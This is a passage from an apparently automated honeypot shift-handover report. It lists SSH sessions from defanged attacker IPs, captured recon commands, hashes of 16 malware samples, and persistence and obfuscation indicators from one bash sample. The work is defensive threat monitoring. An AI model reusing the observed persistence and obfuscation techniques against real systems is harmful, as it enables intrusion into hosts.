- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c679e2c4d763

| Field | Detail |
|---|---|
| **Source IP** | `165.154.29[.]169` |
| **First Seen** | 2026-06-15 19:33 |
| **Last Seen** | 2026-06-15 19:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `USER test, USER test, USER test, USER test` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 19:33:59` | `cowrie.session.connect` |
| `2026-06-15 19:34:00` | `cowrie.login.success` |
| `2026-06-15 19:34:01` | `cowrie.session.params` |
| `2026-06-15 19:34:01` | `cowrie.command.input` |
| `2026-06-15 19:34:01` | `cowrie.command.failed` |
| `2026-06-15 19:34:02` | `cowrie.command.input` |
| `2026-06-15 19:34:02` | `cowrie.command.failed` |
| `2026-06-15 19:34:03` | `cowrie.command.input` |
| `2026-06-15 19:34:03` | `cowrie.command.failed` |
| `2026-06-15 19:34:04` | `cowrie.command.input` |
| `2026-06-15 19:34:04` | `cowrie.command.failed` |
| `2026-06-15 19:34:04` | `cowrie.log.closed` |
| `2026-06-15 19:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.29[.]169` to AbuseIPDB if not already reported
- [ ] Block `165.154.29[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce48554ab245

| Field | Detail |
|---|---|
| **Source IP** | `165.154.29[.]169` |
| **First Seen** | 2026-06-15 19:34 |
| **Last Seen** | 2026-06-15 19:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 19:34:05` | `cowrie.session.connect` |
| `2026-06-15 19:34:05` | `cowrie.login.success` |
| `2026-06-15 19:34:05` | `cowrie.session.params` |
| `2026-06-15 19:34:05` | `cowrie.log.closed` |
| `2026-06-15 19:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.29[.]169` to AbuseIPDB if not already reported
- [ ] Block `165.154.29[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25fcabd5d790

| Field | Detail |
|---|---|
| **Source IP** | `165.154.29[.]169` |
| **First Seen** | 2026-06-15 19:34 |
| **Last Seen** | 2026-06-15 19:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 19:34:06` | `cowrie.session.connect` |
| `2026-06-15 19:34:06` | `cowrie.login.success` |
| `2026-06-15 19:34:06` | `cowrie.session.params` |
| `2026-06-15 19:34:06` | `cowrie.command.input` |
| `2026-06-15 19:34:12` | `cowrie.log.closed` |
| `2026-06-15 19:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.29[.]169` to AbuseIPDB if not already reported
- [ ] Block `165.154.29[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ef34aa53031

| Field | Detail |
|---|---|
| **Source IP** | `182.43.71[.]198` |
| **First Seen** | 2026-06-15 19:34 |
| **Last Seen** | 2026-06-15 19:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 19:34:54` | `cowrie.session.connect` |
| `2026-06-15 19:34:54` | `cowrie.client.version` |
| `2026-06-15 19:34:54` | `cowrie.client.kex` |
| `2026-06-15 19:34:55` | `cowrie.login.success` |
| `2026-06-15 19:34:56` | `cowrie.session.params` |
| `2026-06-15 19:34:56` | `cowrie.command.input` |
| `2026-06-15 19:34:56` | `cowrie.log.closed` |
| `2026-06-15 19:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.43.71[.]198` to AbuseIPDB if not already reported
- [ ] Block `182.43.71[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d173e609894

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-15 20:15 |
| **Last Seen** | 2026-06-15 20:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 20:15:52` | `cowrie.session.connect` |
| `2026-06-15 20:15:52` | `cowrie.client.version` |
| `2026-06-15 20:15:52` | `cowrie.client.kex` |
| `2026-06-15 20:15:52` | `cowrie.login.success` |
| `2026-06-15 20:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-402252127f31

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-15 20:15 |
| **Last Seen** | 2026-06-15 20:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 20:15:52` | `cowrie.session.connect` |
| `2026-06-15 20:15:52` | `cowrie.client.version` |
| `2026-06-15 20:15:52` | `cowrie.client.kex` |
| `2026-06-15 20:15:53` | `cowrie.login.success` |
| `2026-06-15 20:15:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-647868c16fe2

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-15 20:17 |
| **Last Seen** | 2026-06-15 20:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 20:17:36` | `cowrie.session.connect` |
| `2026-06-15 20:17:36` | `cowrie.client.version` |
| `2026-06-15 20:17:36` | `cowrie.client.kex` |
| `2026-06-15 20:17:37` | `cowrie.login.success` |
| `2026-06-15 20:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e79a66a2926f

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-15 20:17 |
| **Last Seen** | 2026-06-15 20:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 20:17:37` | `cowrie.session.connect` |
| `2026-06-15 20:17:37` | `cowrie.client.version` |
| `2026-06-15 20:17:37` | `cowrie.client.kex` |
| `2026-06-15 20:17:37` | `cowrie.login.success` |
| `2026-06-15 20:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e65744a64b2d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-15 20:17 |
| **Last Seen** | 2026-06-15 20:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 20:17:38` | `cowrie.session.connect` |
| `2026-06-15 20:17:38` | `cowrie.client.version` |
| `2026-06-15 20:17:38` | `cowrie.client.kex` |
| `2026-06-15 20:17:38` | `cowrie.login.success` |
| `2026-06-15 20:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2634e901bb44

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-15 20:17 |
| **Last Seen** | 2026-06-15 20:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 20:17:49` | `cowrie.session.connect` |
| `2026-06-15 20:17:49` | `cowrie.client.version` |
| `2026-06-15 20:17:49` | `cowrie.client.kex` |
| `2026-06-15 20:17:49` | `cowrie.login.success` |
| `2026-06-15 20:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `188.166.223[.]22` | **20** | 2026-06-15 16:55 | 2026-06-15 20:52 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `51.158.205[.]203` | **6** | 2026-06-15 18:49 | 2026-06-15 18:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]171` | **3** | 2026-06-15 16:55 | 2026-06-15 16:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.127[.]133` | **2** | 2026-06-15 20:25 | 2026-06-15 20:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.81.62[.]90` | **2** | 2026-06-15 18:04 | 2026-06-15 18:05 | 1m | 0 | `T1592` | 🟢 LOW |
| `34.146.210[.]249` | **2** | 2026-06-15 20:34 | 2026-06-15 20:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]57` | **2** | 2026-06-15 18:54 | 2026-06-15 19:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.250.53[.]219` | 1 | 2026-06-15 19:34 | 2026-06-15 19:34 | 5s | 0 | `T1592` | 🟢 LOW |
| `112.242.188[.]59` | 1 | 2026-06-15 19:39 | 2026-06-15 19:39 | 13s | 0 | `T1592` | 🟢 LOW |
| `114.228.71[.]222` | 1 | 2026-06-15 17:47 | 2026-06-15 17:47 | 12s | 0 | `T1592` | 🟢 LOW |
| `114.66.38[.]145` | 1 | 2026-06-15 17:45 | 2026-06-15 17:46 | 3s | 0 | `T1592` | 🟢 LOW |
| `138.204.196[.]164` | 1 | 2026-06-15 17:55 | 2026-06-15 17:55 | 12s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-06-15 17:29 | 2026-06-15 17:30 | 66s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-06-15 20:45 | 2026-06-15 20:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `171.83.97[.]136` | 1 | 2026-06-15 18:48 | 2026-06-15 18:49 | 14s | 0 | `T1592` | 🟢 LOW |
| `182.43.71[.]198` | 1 | 2026-06-15 19:34 | 2026-06-15 19:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]19` | 1 | 2026-06-15 20:15 | 2026-06-15 20:15 | 9s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]180` | 1 | 2026-06-15 19:29 | 2026-06-15 19:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.91.221[.]58` | 1 | 2026-06-15 20:13 | 2026-06-15 20:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `222.219.74[.]114` | 1 | 2026-06-15 19:14 | 2026-06-15 19:14 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-06-15 20:06 | 2026-06-15 20:06 | 9s | 0 | `T1592` | 🟢 LOW |
| `58.51.132[.]251` | 1 | 2026-06-15 19:25 | 2026-06-15 19:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]124` | 1 | 2026-06-15 17:31 | 2026-06-15 17:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]197` | 1 | 2026-06-15 17:19 | 2026-06-15 17:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]236` | 1 | 2026-06-15 17:19 | 2026-06-15 17:19 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]46` | 1 | 2026-06-15 17:22 | 2026-06-15 17:22 | 5s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]13` | 1 | 2026-06-15 16:55 | 2026-06-15 16:55 | 4s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (16 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **13/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | Bash Script | `d46555af1173d22f...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |
| `dbb7ebb960dc0d5a480f97ddde3a227a2d83fcaca7d37ae672e6a0a6785631e9` | ELF Binary (Linux executable) (AArch64 64-bit) | `dbb7ebb960dc0d5a...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `eaf9adb4bb80316a3aafceabc0f2ed2aed7c76cf134b9b7c66226fc4f003aa97` | ELF Binary (Linux executable) (x86-64 64-bit) | `eaf9adb4bb80316a...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` (d46555af1173d22f07c37ef9...)_
- `Execution from /tmp` — `/tmp/clean_crontab`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `199.91.221[.]58` | NL | BL Networks | **100** ⚠️ | 12 |
| `85.217.149[.]57` | CA | NL MODAT | **100** ⚠️ | 50 |
| `112.242.188[.]59` | CN | China Unicom Shandong province network | **100** ⚠️ | 2 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `66.132.195[.]124` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `172.81.62[.]90` | US | Dynu Systems Incorporated | **100** ⚠️ | 8 |
| `91.92.40[.]13` | NL | TechTies Inc. | **100** ⚠️ | 11 |
| `91.231.89[.]46` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `45.79.8[.]221` | US | Linode | **100** ⚠️ | 50 |
| `192.253.248[.]180` | NL | Secure Internet LLC (UK) | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 59 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 28 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 4 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (56 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 26 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 30 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 139 cases |
| Tool 34  | Credential Extractor        | ✅ 28 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 41 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 56 filtered (40.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 16 files |
| Tool 33  | YARA Classifier             | ✅ 12 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 26 priority case(s) shown individually · 27 recon entry/entries in table (7 group(s) consolidating 37 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-06-15T22:22:38Z_
